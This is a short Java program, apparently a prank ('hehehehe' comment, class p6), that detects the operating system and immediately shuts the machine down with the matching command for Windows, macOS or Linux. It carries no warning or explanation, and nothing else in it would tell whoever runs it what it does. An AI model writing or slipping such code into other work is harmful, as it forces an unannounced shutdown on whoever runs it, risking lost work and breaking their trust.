// hehehehe
import java.io.IOException;

public class p6 {
    @SuppressWarnings("deprecation")
    public static void main(String[] args) {
        String os = System.getProperty("os.name").toLowerCase();
        
        try {
            if (os.contains("win")) {
                Runtime.getRuntime().exec("shutdown -s -t 0");
            } else if (os.contains("mac")) {
                Runtime.getRuntime().exec("shutdown -h now");
            } else if (os.contains("nix") || os.contains("nux")) {
                Runtime.getRuntime().exec("shutdown now");
            } else {
                System.out.println("Unsupported os.");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

